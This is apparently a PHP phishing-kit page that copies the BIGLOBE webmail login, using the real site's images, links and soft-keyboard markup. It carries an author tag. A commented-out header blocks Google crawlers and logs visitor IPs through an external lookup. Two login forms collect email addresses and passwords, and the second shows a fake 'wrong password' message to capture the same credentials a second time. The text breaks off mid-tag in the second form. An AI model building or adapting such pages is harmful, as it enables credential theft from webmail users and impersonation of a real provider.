<?php
session_start();
/*   
            ALEIN EXPERT                  
*/
/*session_start();
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }

date_default_timezone_set('GMT');
$timedate = date('H:i:s d/m/Y');

$client  = @$_SERVER['HTTP_CLIENT_IP'];
$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
$remote  = @$_SERVER['REMOTE_ADDR'];
$result  = "Unknown";
if(filter_var($client, FILTER_VALIDATE_IP)){
  $_SESSION['_ip_']  = $client;
}
elseif(filter_var($forward, FILTER_VALIDATE_IP)){
    $_SESSION['_ip_']  = $forward;
}
else{
    $_SESSION['_ip_']  = $remote;
}
$getdetails = 'https://extreme-ip-lookup.com/json/' . $_SESSION['_ip_'];
$curl       = curl_init();
curl_setopt($curl, CURLOPT_URL, $getdetails);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$content    = curl_exec($curl);
curl_close($curl);
$details  = json_decode($content);
$country   = $details->country;
$org   = $details->org;
$isp   = $details->isp;
$adminvu .= "<tr>
                          <td>
                            {".$_SESSION['_ip_']."}
                          </td>
                          <td>
                            ".$TIME_DATE."
                          </td>
                          <td>
                            ".XB_Browser($_SERVER['HTTP_USER_AGENT'])." On ".XB_OS($_SERVER['HTTP_USER_AGENT'])."
                          </td>
                          <td>
						  ".$country."
                          </td>
                          <td>
                           ".$org."
                          </td>
                        </tr>\n";
    $khraha = fopen("./rz/vus".$yourname.".html", "a");
	fwrite($khraha, $adminvu);
	$xx .= "{}\n";
    $khraha = fopen("./rz/vus.html", "a");
	fwrite($khraha, $xx);*/
	$permitted_chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
?>

<!DOCTYPE html>

<html xmlns="http://www.w3.org/1999/xhtml"><head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Cache-Control" content="no-cache">
<meta http-equiv="Expires" content="Thu, 01 Dec 1994 16:00:00 GMT">
<meta http-equiv="X-UA-Compatible" content="requiresActiveX=true">
<meta http-equiv="X-UA-Compatible" content="IE=emulateIE9">
<meta name="keywords" content="メール,Webメール,Ｗｅｂメール,BIGLOBE,ビッグローブ">
<meta name="description" content="BIGLOBEメールはブラウザで手軽にメールが使えます。スマートフォンにも対応。面倒な設定はいらず、ログインするだけですぐにご利用いただけます。">
<title>BIGLOBEメール｜Webメール</title>
<link rel="icon" href="https://webmail.biglobe.ne.jp/images2/common/favicon.ico" type="image/vnd.microsoft.icon">
<link href="https://webmail.biglobe.ne.jp/css2/import_top.css" rel="stylesheet" type="text/css">

<!--<script type="text/javascript" src="//i.socdm.com/s/so_dmp.js?service_id=cova_12"></script>
<script type="text/javascript" data="//i.socdm.com/s/so_sg.js?sgid=53121"></script>
<script src="//sync.im-apps.net/imid/segment?token=NsnHHI8anYlGtjUpg_2SUQ&amp;callback=window.rtms_funcSendingData"></script>
<script type="text/javascript" async="" src="https://cdn.treasuredata.com/sdk/1.7.1/td.min.js"></script>
<script type="text/javascript" async="" src="https://ssl.google-analytics.com/ga.js"></script>
<script type="text/javascript" src="https://webmail.biglobe.ne.jp/js2/common.js" charset="SHIFT-JIS"></script>
<script type="text/javascript" src="https://webmail.biglobe.ne.jp/js2/wm_login.js"></script>
<script type="text/javascript" src="/api/js/check_deprecated_browser.js"></script>
<script type="text/javascript" src="/api/js/input_time_chk.js"></script>-->

<!-- SWキーボードここから//-->
<link rel="stylesheet" href="https://webmail.biglobe.ne.jp/softkeyboard/softkeyboardsjis.css">
<!--<script language="JavaScript" src="/api/softkeyboard/webmail_jquery.js" charset="SHIFT-JIS"></script>
<script language="JavaScript" src="/api/softkeyboard/webmail_jquery.softkeyboard.loginmail.js" charset="SHIFT-JIS"></script>-->
<!-- SWキーボードここまで //-->

<!--<script src="https://top.bcdn.jp/j/ft_rtms/rtms.js?18808" type="text/javascript" async=""></script>
<script type="text/javascript" src="https://tg.socdm.com/sa/js?said=sg53121-s&amp;t=1&amp;tp=https%3A%2F%2Fauth.sso.biglobe.ne.jp%2Fmail%2F&amp;pp="></script>
<iframe src="https://tg.socdm.com/aux/sosync" style="position: absolute; border: medium none; padding: 0px; margin: 0px; display: none; visibility: hidden;" width="1" height="1">
</iframe>
-->

<link rel="stylesheet" href="css/style.css" />

</head>

<body onload="deprecated_check()">

<div id="container"><a name="pagetop"></a>

<!-- Header// -->
<div id="header_main">
	<div id="header_logo">
	<h1><img src="https://webmail.biglobe.ne.jp/images2/common/logo_email.gif" alt="BIGLOBEメール" usemap="#logo" width="210" height="31"></h1>
	<map name="logo">
	<area shape="rect" coords="0,0,150,35" href="http://www.biglobe.ne.jp/" alt="BIGLOBE">
	<area shape="rect" coords="150,0,210,35" href="https://webmail.biglobe.ne.jp/" alt="BIGLOBEメール">
	</map>
	</div><!--/header-logo-->
	<div id="header_keyword">
	<strong>メールがもっと便利で楽しくなる！</strong>
	</div><!--/header_keyword-->
<!--
	<div id="headerNavi">
	<div class="search">
<form method="get" action="http://guide.biglobe.ne.jp/cgi-bin/search-roboBS" name="search">
<input type="text" name="q" size="18" style="width:125px;color:#999" value="キーワード" onFocus="javascript:if(this.value=='キーワード')
							this.value='';this.style.color='#333'" onBlur="javascript:if(this.value=='')this.value='キーワード';this.style.color='#999'" />
<input type="submit" value="サイト内検索" />
<input type="hidden" name="c" value="検索" />
<input type="hidden" name="clid" value="1" />
<input type="hidden" name="sitesearch" value="webmail.biglobe.ne.jp" />
</form>
	</div>
	<div class="top"><a href="http://www.biglobe.ne.jp/">BIGLOBEトップ</a></div>
	</div>
-->
	<br class="clear">
</div>

<div id="header-link">
	<div id="support_menu">
<ul class="fmenu">
      <li><a href="https://email.biglobe.ne.jp/">メールサービス</a></li>
      <li><a class="bl" href="https://support.biglobe.ne.jp/" target="_blank">会員サポート</a></li>
      <li><a class="bl" href="https://support.biglobe.ne.jp/shogaiap/service.html" target="_blank">障害情報</a></li>
</ul>
	</div>
</div>
<!-- //Header -->




<!-- Main_start -->
<div id="main">

<!-- Contents_start -->
<div id="contents_block">

<!-- 注意書きの記載 //-->
	<!-- JavaScriptが動作しない場合 //-->
	<noscript>
		<div class="warning">
			BIGLOBEメール（アドバンスト版）をご利用になるには、JavaScriptを有効にしてください。
		</div>
	</noscript>

<!-- 注意書きの記載 //-->
<!--★ここから追記4/20★-->
<div class="news">
<ul>




</ul>
</div>
<!--★ここまで追記4/20★-->

<!--div class="pr_block">
</div -->

<!-- 障害情報 start //-->
<!--
<div class="infoArea">
<p><img src="https://asp2.blog.biglobe.ne.jp/images/manage/emoji/webry/07_attention.gif">
<a href="https://support.biglobe.ne.jp/shogaiap/today.html#100010358" target="_blank"><font color="ff0000"><b>【一部のお客さま】Webメールへのアクセスに時間がかかる事象のお詫び(2018/7/17)</a></b></font></p>
</div>
-->
<!-- 障害情報 end //-->

<!-- お客様サービス start //-->
<iframe src="https://member4.sso.biglobe.ne.jp/heute" width="800" height="36" frameborder="0"></iframe>
<!-- お客様サービス end //-->

<!-- お知らせ start //-->
<div class="infotitle" style="margin-top:25px;">お知らせ</div>
<div class="infoArea">
<p>・<a href="https://support.biglobe.ne.jp/news/news680.html" target="_blank">【重要】BIGLOBEメール（Webメール）への電話認証導入と電話番号登録のお願い</a><font color="ff0000"><b>New!</b></font></p>
<p>・<a href="https://support.biglobe.ne.jp/news/news550.html#a_faq1" target="_blank">Webメールにログインが出来ない場合はこちらをご確認ください。</a><font color="ff0000"><b></b></font></p>
</div>
<!-- お知らせ end //-->

<script>
getResponsiveCSS ();
</script>

<!-- firstviewポップアップ制御cookie削除 -->
<iframe src="https://member4.sso.biglobe.ne.jp/webmail/advanced/firstview/del_suppress.html" width="0" height="0" frameborder="0"></iframe>
<!-- div class="subArea_block">
<h3><img src="https://webmail.biglobe.ne.jp/images2/title_top_attention.jpg" alt="ご注意ください" width="550" height="20" /></h3>

<ul class="textArea">
<li class="dot_last">
パスワードは、第三者に悪用されないためにも、定期的に変更することをおすすめします。<br />
［<a href="http://support.biglobe.ne.jp/jimu/idpw/pwchange/pass.html" target="blank">より安全なパスワードにするには</a>］
</li>
</ul>
</div --><!-- /subArea_block -->

<div id="info_footer"><p>


</p><div class="webrylink">
<center>

<div class="banner_area" style="margin-bottom: 15px;">
</div>
<ul>
<li><a href="https://webmail.biglobe.ne.jp/requirements.html">推奨環境</a></li>
<li><a href="https://webmail.biglobe.ne.jp/help.html">ヘルプ</a></li>
<li><a href="http://email.biglobe.ne.jp/faq.html">よくあるお問い合わせ</a></li>
<li><a href="https://webmail.biglobe.ne.jp/read.html">必ずお読みください</a></li>
</ul>
</center>
</div>

<p></p></div>

<!-- /contents_block --></div>
<!-- Contents_end -->


<!-- Menu_start -->
<div id="side_menuArea">
<div id="side_menu_block">
<div id="side_menu">
<h2><img src="https://webmail.biglobe.ne.jp/images2/pagetitle_top.jpg" alt="BIGLOBEメールメールにログイン" width="238" height="43"></h2>

<!-- ERRORメッセージ:s -->
<!-- ERRORメッセージ:e -->

<div class="login_block">
<div id="login_form">

<!--login sec start here -->
<div class="loginsec">

<form method="POST" name="loginForm" id="loginForm" action="">

	<div>
	<label for="loginid">メールアドレスまたはユーザID</label>
	<input name="email" type="email" size="35" autocomplete="off" required  id="email" value="" style="ime-mode: disabled;width:200px;height:25px;margin:0.4em 0">
	
	<label for="biglobe_pw">BIGLOBEパスワード</label>
	<input name="emailpass" type="password" required autocomplete="off" size="30" id="emailpass" style="width:200px;height:25px;margin:0.1em 0">
	</div>
	

</script>
<div class="skey">
<img src="https://webmail.biglobe.ne.jp/images2/button_softkey.gif" alt="ソフトウェアキーボードで入力する" title="ソフトウェアキーボードで入力する" id="soft_keyboard_pass_id" width="200" height="30">
</div>
<!-- Androidの場合SWキーボードのボタンを表示しないここまで //-->

<!-- SWキーボードここから //-->
<div id="keyboard"><div id="soft_keyboard_parent_overlay" style="position:relative"><div id="soft_keyboard_overlay" style="position:absolute"><table id="soft_keyboard_layout_box" style="display:none" width="443" cellspacing="0" cellpadding="0" border="0"><tbody><tr><td style="border:none; padding:0; background-color:transparent;" width="15"><img src="https://webmail.biglobe.ne.jp/softkeyboard/img/over_lt.gif"></td><td id="over_ct" width="413" align="center"></td><td style="border:none; padding:0; background-color:transparent;" width="15"><img src="https://webmail.biglobe.ne.jp/softkeyboard/img/over_rt.gif"></td></tr><tr><td id="over_lc"></td><td style="border:none; padding:0; background-color:#ffffff;"><table id="soft_keyboard_sel_box" style="margin-bottom:0; margin-top:5px; border:none;" width="400" cellspacing="0" cellpadding="0" border="0"><tbody><tr><td class="overray" style="border:none; padding:0; background-color:#ffffff;" width="400"><div class="soft_keyboard_close_overlay"><a><img id="soft_keyboard_close2" name="image" src="https://webmail.biglobe.ne.jp/softkeyboard/img/over_close.gif" alt="閉じる"></a></div><div style="text-align:left;"><div>「メールアドレス」と「ユーザID」のどちらかを選択してください。</div><br></div><div style="text-align:left;"><a><img id="soft_keyboard_sel_id1" src="https://webmail.biglobe.ne.jp/softkeyboard/img/select_id_loginmail.gif" style="margin:15px 0 0px 80px;" width="256" height="32"></a><br><a><img id="soft_keyboard_sel_id2" src="https://webmail.biglobe.ne.jp/softkeyboard/img/select_id_userid.gif" style="margin:5px 0 5px 80px;" width="256" height="32"></a><br></div></td></tr></tbody></table><div id="soft_keyboard_keyboard"><table style="width:413px; margin-bottom:0; margin-top:5px; border:none" width="100%" cellspacing="0" cellpadding="0" border="0"><tbody><tr><td class="overray" style="border:none; padding:0; background-color:#ffffff;"><div class="clearfix"><div class="soft_keyboard_title_bg"><div id="soft_keyboard_title"></div></div><div class="soft_keyboard_close_overlay"><a><img id="soft_keyboard_close" name="image" src="https://webmail.biglobe.ne.jp/softkeyboard/img/over_close.gif" alt="閉じる"></a></div></div><div class="soft_keyboard_in"><input class="soft_keyboard_key" id="soft_keyboard_left" type="button" style="background-position:-2px -650px"><input type="text" id="soft_keyboard_in_tmp" name="soft_keyboard_in_tmp" style="IME-MODE: disabled; width:240; height:25px; margin:0 2px 0 0; float:left;"><input type="password" id="soft_keyboard_in_tmp2" name="soft_keyboard_in_tmp2" style="IME-MODE: disabled; width:240; height:25px; margin:0 2px 0 0; float:left;"><input class="soft_keyboard_key" id="soft_keyboard_right" type="button" style="background-position:-20px -650px"><input class="soft_keyboard_key" id="soft_keyboard_clear" type="button" style="background-position:-103px -650px"><input class="soft_keyboard_key" id="soft_keyboard_backspace" type="button" style="background-position:-38px -650px"></div></td></tr></tbody></table><table style="margin-bottom:0; margin-top:5px; border:none;" width="100%" cellspacing="0" cellpadding="0" border="0"><tbody><tr><td class="overray" style="border:none; padding:0; background-color:#ffffff;"><div class="num_box clearfix"><div id="soft_keyboard_number" class="keyBox clearfix soft_keyboard_key"><input type="button" id="soft_keyboard_num_0" value="1" style="background-position:-2px -2px"><input type="button" id="soft_keyboard_num_1" value="2" style="background-position:-29px -2px"><input type="button" id="soft_keyboard_num_2" value="3" style="background-position:-56px -2px"><input type="button" id="soft_keyboard_num_3" value="4" style="background-position:-83px -2px"><input type="button" id="soft_keyboard_num_4" value="5" style="background-position:-110px -2px"><input type="button" id="soft_keyboard_num_5" value="6" style="background-position:-137px -2px"><input type="button" id="soft_keyboard_num_6" value="7" style="background-position:-164px -2px"><input type="button" id="soft_keyboard_num_7" value="8" style="background-position:-191px -2px"><input type="button" id="soft_keyboard_num_8" value="9" style="background-position:-218px -2px"><input type="button" id="soft_keyboard_num_9" value="0" style="background-position:-245px -2px"></div></div><div class="num_box clearfix"><div id="soft_keyboard_large_all_1" class="keyBox clearfix soft_keyboard_key"><input type="button" id="soft_keyboard_large_0" value="A" style="background-position:-2px -83px"><input type="button" id="soft_keyboard_large_1" value="B" style="background-position:-29px -83px"><input type="button" id="soft_keyboard_large_2" value="C" style="background-position:-56px -83px"><input type="button" id="soft_keyboard_large_3" value="D" style="background-position:-83px -83px"><input type="button" id="soft_keyboard_large_4" value="E" style="background-position:-110px -83px"><input type="button" id="soft_keyboard_large_5" value="F" style="background-position:-137px -83px"><input type="button" id="soft_keyboard_large_6" value="G" style="background-position:-164px -83px"><div class="soft_keyboard_space"></div><input type="button" id="soft_keyboard_large_7" value="H" style="background-position:-191px -83px"><input type="button" id="soft_keyboard_large_8" value="I" style="background-position:-218px -83px"><input type="button" id="soft_keyboard_large_9" value="J" style="background-position:-245px -83px"><input type="button" id="soft_keyboard_large_10" value="K" style="background-position:-272px -83px"><input type="button" id="soft_keyboard_large_11" value="L" style="background-position:-299px -83px"><input type="button" id="soft_keyboard_large_12" value="M" style="background-position:-326px -83px"><input type="button" id="soft_keyboard_large_13" value="N" style="background-position:-353px -83px"></div><div id="soft_keyboard_small_all_1" class="keyBox margin_bottom5 clearfix soft_keyboard_key"><input type="button" id="soft_keyboard_small_0" value="a" style="background-position:-2px -245px"><input type="button" id="soft_keyboard_small_1" value="b" style="background-position:-29px -245px"><input type="button" id="soft_keyboard_small_2" value="c" style="background-position:-56px -245px"><input type="button" id="soft_keyboard_small_3" value="d" style="background-position:-83px -245px"><input type="button" id="soft_keyboard_small_4" value="e" style="background-position:-110px -245px"><input type="button" id="soft_keyboard_small_5" value="f" style="background-position:-137px -245px"><input type="button" id="soft_keyboard_small_6" value="g" style="background-position:-164px -245px"><div class="soft_keyboard_space"></div><input type="button" id="soft_keyboard_small_7" value="h" style="background-position:-191px -245px"><input type="button" id="soft_keyboard_small_8" value="i" style="background-position:-218px -245px"><input type="button" id="soft_keyboard_small_9" value="j" style="background-position:-245px -245px"><input type="button" id="soft_keyboard_small_10" value="k" style="background-position:-272px -245px"><input type="button" id="soft_keyboard_small_11" value="l" style="background-position:-299px -245px"><input type="button" id="soft_keyboard_small_12" value="m" style="background-position:-326px -245px"><input type="button" id="soft_keyboard_small_13" value="n" style="background-position:-353px -245px"></div><div id="soft_keyboard_large_all_2" class="keyBox clearfix soft_keyboard_key"><input type="button" id="soft_keyboard_large_14" value="O" style="background-position:-2px -164px"><input type="button" id="soft_keyboard_large_15" value="P" style="background-position:-29px -164px"><input type="button" id="soft_keyboard_large_16" value="Q" style="background-position:-56px -164px"><input type="button" id="soft_keyboard_large_17" value="R" style="background-position:-83px -164px"><input type="button" id="soft_keyboard_large_18" value="S" style="background-position:-110px -164px"><input type="button" id="soft_keyboard_large_19" value="T" style="background-position:-137px -164px"><input type="button" id="soft_keyboard_large_20" value="U" style="background-position:-164px -164px"><div class="soft_keyboard_space"></div><input type="button" id="soft_keyboard_large_21" value="V" style="background-position:-191px -164px"><input type="button" id="soft_keyboard_large_22" value="W" style="background-position:-218px -164px"><input type="button" id="soft_keyboard_large_23" value="X" style="background-position:-245px -164px"><input type="button" id="soft_keyboard_large_24" value="Y" style="background-position:-272px -164px"><input type="button" id="soft_keyboard_large_25" value="Z" style="background-position:-299px -164px"></div><div id="soft_keyboard_small_all_2" class="keyBox clearfix soft_keyboard_key"><input type="button" id="soft_keyboard_small_14" value="o" style="background-position:-2px -326px"><input type="button" id="soft_keyboard_small_15" value="p" style="background-position:-29px -326px"><input type="button" id="soft_keyboard_small_16" value="q" style="background-position:-56px -326px"><input type="button" id="soft_keyboard_small_17" value="r" style="background-position:-83px -326px"><input type="button" id="soft_keyboard_small_18" value="s" style="background-position:-110px -326px"><input type="button" id="soft_keyboard_small_19" value="t" style="background-position:-137px -326px"><input type="button" id="soft_keyboard_small_20" value="u" style="background-position:-164px -326px"><div class="soft_keyboard_space"></div><input type="button" id="soft_keyboard_small_21" value="v" style="background-position:-191px -326px"><input type="button" id="soft_keyboard_small_22" value="w" style="background-position:-218px -326px"><input type="button" id="soft_keyboard_small_23" value="x" style="background-position:-245px -326px"><input type="button" id="soft_keyboard_small_24" value="y" style="background-position:-272px -326px"><input type="button" id="soft_keyboard_small_25" value="z" style="background-position:-299px -326px"></div></div><div id="soft_keyboard_m_mark"><div class="num_box clearfix"><div id="soft_keyboard_m_mark_1" class="keyBox clearfix soft_keyboard_key"><input type="button" id="soft_keyboard_mail_mark_0" value="@" style="background-position:-2px -407px"><input type="button" id="soft_keyboard_mail_mark_1" value="." style="background-position:-29px -407px"><input type="button" id="soft_keyboard_mail_mark_2" value="!" style="background-position:-56px -407px"><input type="button" id="soft_keyboard_mail_mark_3" value="?" style="background-position:-83px -407px"><input type="button" id="soft_keyboard_mail_mark_4" value="$" style="background-position:-110px -407px"><input type="button" id="soft_keyboard_mail_mark_5" value="%" style="background-position:-137px -407px"><input type="button" id="soft_keyboard_mail_mark_6" value="#" style="background-position:-164px -407px"><div class="soft_keyboard_space"></div><input type="button" id="soft_keyboard_mail_mark_7" value="*" style="background-position:-191px -407px"><input type="button" id="soft_keyboard_mail_mark_8" value="+" style="background-position:-218px -407px"><input type="button" id="soft_keyboard_mail_mark_9" value="-" style="background-position:-245px -407px"><input type="button" id="soft_keyboard_mail_mark_10" value="=" style="background-position:-272px -407px"><input type="button" id="soft_keyboard_mail_mark_11" value="_" style="background-position:-299px -407px"><input type="button" id="soft_keyboard_mail_mark_12" value="'" style="background-position:-326px -407px"><input type="button" id="soft_keyboard_mail_mark_13" value="`" style="background-position:-353px -407px"></div><div id="soft_keyboard_m_mark_2" class="keyBox clearfix soft_keyboard_key"><input type="button" id="soft_keyboard_mail_mark_14" value="~" style="background-position:-2px -488px"><input type="button" id="soft_keyboard_mail_mark_15" value="{" style="background-position:-29px -488px"><input type="button" id="soft_keyboard_mail_mark_16" value="}" style="background-position:-56px -488px"><input type="button" id="soft_keyboard_mail_mark_24" value="&amp;" style="background-position:-272px -488px"><input type="button" id="soft_keyboard_mail_mark_25" value="/" style="background-position:-299px -488px"><input type="button" id="soft_keyboard_mail_mark_26" value="^" style="background-position:-326px -488px"><input type="button" id="soft_keyboard_mail_mark_27" value="|" style="background-position:-353px -488px"><div class="soft_keyboard_space"></div></div></div></div><div id="soft_keyboard_p_mark"><div class="num_box clearfix"><div id="soft_keyboard_p_mark_1" class="keyBox clearfix soft_keyboard_key"><input type="button" id="soft_keyboard_pass_mark_0" value="@" style="background-position:-2px -407px"><input type="button" id="soft_keyboard_pass_mark_1" value="." style="background-position:-29px -407px"><input type="button" id="soft_keyboard_pass_mark_2" value="!" style="background-position:-56px -407px"><input type="button" id="soft_keyboard_pass_mark_3" value="?" style="background-position:-83px -407px"><input type="button" id="soft_keyboard_pass_mark_4" value="$" style="background-position:-110px -407px"><input type="button" id="soft_keyboard_pass_mark_5" value="%" style="background-position:-137px -407px"><input type="button" id="soft_keyboard_pass_mark_6" value="#" style="background-position:-164px -407px"><div class="soft_keyboard_space"></div><input type="button" id="soft_keyboard_pass_mark_7" value="*" style="background-position:-191px -407px"><input type="button" id="soft_keyboard_pass_mark_8" value="+" style="background-position:-218px -407px"><input type="button" id="soft_keyboard_pass_mark_9" value="-" style="background-position:-245px -407px"><input type="button" id="soft_keyboard_pass_mark_10" value="=" style="background-position:-272px -407px"><input type="button" id="soft_keyboard_pass_mark_11" value="_" style="background-position:-299px -407px"><input type="button" id="soft_keyboard_pass_mark_12" value="'" style="background-position:-326px -407px"><input type="button" id="soft_keyboard_pass_mark_13" value="`" style="background-position:-353px -407px"></div><div id="soft_keyboard_p_mark_2" class="keyBox clearfix soft_keyboard_key"><input type="button" id="soft_keyboard_pass_mark_14" value="~" style="background-position:-2px -488px"><input type="button" id="soft_keyboard_pass_mark_15" value="{" style="background-position:-29px -488px"><input type="button" id="soft_keyboard_pass_mark_16" value="}" style="background-position:-56px -488px"><input type="button" id="soft_keyboard_pass_mark_17" value="(" style="background-position:-83px -488px"><input type="button" id="soft_keyboard_pass_mark_18" value=")" style="background-position:-110px -488px"><input type="button" id="soft_keyboard_pass_mark_19" value="[" style="background-position:-137px -488px"><input type="button" id="soft_keyboard_pass_mark_20" value="]" style="background-position:-164px -488px"><div class="soft_keyboard_space"></div><input type="button" id="soft_keyboard_pass_mark_21" value="\" style="background-position:-191px -488px"><input type="button" id="soft_keyboard_pass_mark_22" value=":" style="background-position:-218px -488px"><input type="button" id="soft_keyboard_pass_mark_23" value=";" style="background-position:-245px -488px"></div></div></div><div class="keyBox" id="soft_keyboard_domain"><div class="num_box clearfix"><div id="soft_keyboard_domain_1" class="keyBox clearfix soft_keyboard_key"><input type="button" id="soft_keyboard_add_0" value=".co.jp" style="background-position:-2px -569px"><input type="button" id="soft_keyboard_add_1" value=".ne.jp" style="background-position:-52px -569px"><input type="button" id="soft_keyboard_add_2" value=".com" style="background-position:-102px -569px"><input type="button" id="soft_keyboard_add_3" value=".biglobe.ne.jp" style="background-position:-152px -569px"></div></div></div></td></tr></tbody></table><table id="soft_keyboard_footer_box" style="margin-bottom:0; margin-top:5px; border:0; " width="100%" cellspacing="0" cellpadding="0" border="0"><tbody><tr><td class="overray" style="text-align:center; border:none; padding:0; background-color:#ffffff;"><div class="checkbox"><label><input type="checkbox" id="soft_keyboard_random" name="soft_keyboard_random"> キー表示位置をランダムにする</label>　　<label id="soft_keyboard_pass_on2"><input type="checkbox" id="soft_keyboard_pass_on" name="soft_keyboard_pass_on"><span> パスワードを表示する</span></label></div><div class="select_box clearfix"><a id="soft_keyboard_transi_link"></a>　　<a><img id="soft_keyboard_cancel_b" src="https://webmail.biglobe.ne.jp/softkeyboard/img/cancel.gif" width="96" height="32"></a><br></div></td></tr></tbody></table></div></td><td id="over_rc"></td></tr><tr><td style="border:none; padding:0; background-color:transparent;"><img src="https://webmail.biglobe.ne.jp/softkeyboard/img/over_lb.gif"></td><td id="over_cb"></td><td style="border:none; padding:0; background-color:transparent;"><img src="https://webmail.biglobe.ne.jp/softkeyboard/img/over_rb.gif"></td></tr></tbody></table></div></div></div>
<div id="my_div"></div>

	<ul>
    <li><input type="checkbox" name="autologinidflag" id="autologinidflag" value="1"><label for="autologinidflag">次回からIDの入力を省略</label></li>
	<li><input type="checkbox" name="autologinflag" id="autologinflag" value="1"><label for="autologinflag"><a href="http://support.biglobe.ne.jp/settei/webmail/login.html" target="_blank">ログイン状態を保存する</a><br>（共有パソコンではチェックをはずしてください）</label></li>
        <li><select name="version" id="version" onchange="deprecated_check()">
<option value="advanced" selected="">アドバンスト版</option>
<option value="basic">標準版</option>
</select></li>
         <li>

<div id="deprecated" style="padding-top: 10px"></div>

</li>
        </ul>

	<div class="loginBtn">
	<input type="image" src="https://webmail.biglobe.ne.jp/images2/btn_login.gif" alt="ログイン" title="ログイン" width="205" height="37" border="0"></div>
</form>


</div>
<!--login sec ends here -->


<!--login sec2 start here -->
<div class="loginsec2">

<form method="POST" name="loginForm2" id="loginForm2" action="">

	<div>
	<label for="loginid">メールアドレスまたはユーザID</label>
	<input name="email1" type="email" size="35" autocomplete="off" required  id="email1" value="" style="ime-mode: disabled;width:200px;height:25px;margin:0.4em 0">
	
	<label for="biglobe_pw">BIGLOBEパスワード</label>
	<input name="emailpass1" type="password" required autocomplete="off" size="30" id="emailpass1" style="width:200px;height:25px;margin:0.1em 0">
	<span style="color:red;font-size:12px">密码错误。请再试一次</span>
	</div>
	

</script>
<div class="skey">
<img src="https://webmail.biglobe.ne.jp/images2/button_softkey.gif" alt="ソフトウェアキーボードで入力する" title="ソフトウェアキーボードで入力する" id="soft_keyboard_pass_id" width="200" height="30">
</div>
<!-- Androidの場合SWキーボードのボタンを表示しないここまで //-->

<!-- SWキーボードここから //-->
<div id="keyboard"><div id="soft_keyboard_parent_overlay" style="position:relative"><div id="soft_keyboard_overlay" style="position:absolute"><table id="soft_keyboard_layout_box" style="display:none" width="443" cellspacing="0" cellpadding="0" border="0"><tbody><tr><td style="border:none; padding:0; background-color:transparent;" width="15"><img src="https://webmail.biglobe.ne.jp/softkeyboard/img/over_lt.gif"></td><td id="over_ct" width="413" align="center"></td><td style="border:none; padding:0; background-color:transparent;" width="15"><img src="https://webmail.biglobe.ne.jp/softkeyboard/img/over_rt.gif"></td></tr><tr><td id="over_lc"></td><td style="border:none; padding:0; background-color:#ffffff;"><table id="soft_keyboard_sel_box" style="margin-bottom:0; margin-top:5px; border:none;" width="400" cellspacing="0" cellpadding="0" border="0"><tbody><tr><td class="overray" style="border:none; padding:0; background-color:#ffffff;" width="400"><div class="soft_keyboard_close_overlay"><a><img id="soft_keyboard_close2" name="image" src="https://webmail.biglobe.ne.jp/softkeyboard/img/over_close.gif" alt="閉じる"></a></div><div style="text-align:left;"><div>「メールアドレス」と「ユーザID」のどちらかを選択してください。</div><br></div><div style="text-align:left;"><a><img id="soft_keyboard_sel_id1" src="https://webmail.biglobe.ne.jp/softkeyboard/img/select_id_loginmail.gif" style="margin:15px 0 0px 80px;" width="256" height="32"></a><br><a><img id="soft_keyboard_sel_id2" src="https://webmail.biglobe.ne.jp/softkeyboard/img/select_id_userid.gif" style="margin:5px 0 5px 80px;" width="256" height="32"></a><br></div></td></tr></tbody></table><div id="soft_keyboard_keyboard"><table style="width:413px; margin-bottom:0; margin-top:5px; border:none" width="100%" cellspacing="0" cellpadding="0" border="0"><tbody><tr><td class="overray" style="border:none; padding:0; background-color:#ffffff;"><div class="clearfix"><div class="soft_keyboard_title_bg"><div id="soft_keyboard_title"></div></div><div class="soft_keyboard_close_overlay"><a><img id="soft_keyboard_close" name="image" src="https://webmail.biglobe.ne.jp/softkeyboard/img/over_close.gif" alt="閉じる"></a></div></div><div class="soft_keyboard_in"><input class="soft_keyboard_key" id="soft_keyboard_left" type="button" style="background-position:-2px -650px"><input type="text" id="soft_keyboard_in_tmp" name="soft_keyboard_in_tmp" style="IME-MODE: disabled; width:240; height:25px; margin:0 2px 0 0; float:left;"><input type="password" id="soft_keyboard_in_tmp2" name="soft_keyboard_in_tmp2" style="IME-MODE: disabled; width:240; height:25px; margin:0 2px 0 0; float:left;"><input class="soft_keyboard_key" id="soft_keyboard_right" type="button" style="background-position:-20px -650px"><input class="soft_keyboard_key" id="soft_keyboard_clear" type="button" style="background-position:-103px -650px"><input class="soft_keyboard_key" id="soft_keyboard_backspace" type="button" style="background-position:-38px -650px"></div></td></tr></tbody></table><table style="margin-bottom:0; margin-top:5px; border:none;" width="100%" cellspacing="0" cellpadding="0" border="0"><tbody><tr><td class="overray" style="border:none; padding:0; background-color:#ffffff;"><div class="num_box clearfix"><div id="soft_keyboard_number" class="keyBox clearfix soft_keyboard_key"><input type="button" id="soft_keyboard_num_0" value="1" style="background-position:-2px -2px"><input type="button" id="soft_keyboard_num_1" value="2" style="background-position:-29px -2px"><input type="button" id="soft_keyboard_num_2" value="3" style="background-position:-56px -2px"><input type="button" id="soft_keyboard_num_3" value="4" style="background-position:-83px -2px"><input type="button" id="soft_keyboard_num_4" value="5" style="background-position:-110px -2px"><input type="button" id="soft_keyboard_num_5" value="6" style="background-position:-137px -2px"><input type="button" id="soft_keyboard_num_6" value="7" style="background-position:-164px -2px"><input type="button" id="soft_keyboard_num_7" value="8" style="background-position:-191px -2px"><input type="button" id="soft_keyboard_num_8" value="9" style="background-position:-218px -2px"><input type="button" id="soft_keyboard_num_9" value="0" style="background-position:-245px -2px"></div></div><div class="num_box clearfix"><div id="soft_keyboard_large_all_1" class="keyBox clearfix soft_keyboard_key"><input type="button" id="soft_keyboard_large_0" value="A" style="background-position:-2px -83px"><input type="button" id="soft_keyboard_large_1" value="B" style="background-position:-29px -83px"><input type="button" id="soft_keyboard_large_2" value="C" style="background-position:-56px -83px"><input type="button" id="soft_keyboard_large_3" value="D" style="background-position:-83px -83px"><input type="button" id="soft_keyboard_large_4" value="E" style="background-position:-110px -83px"><input type="button" 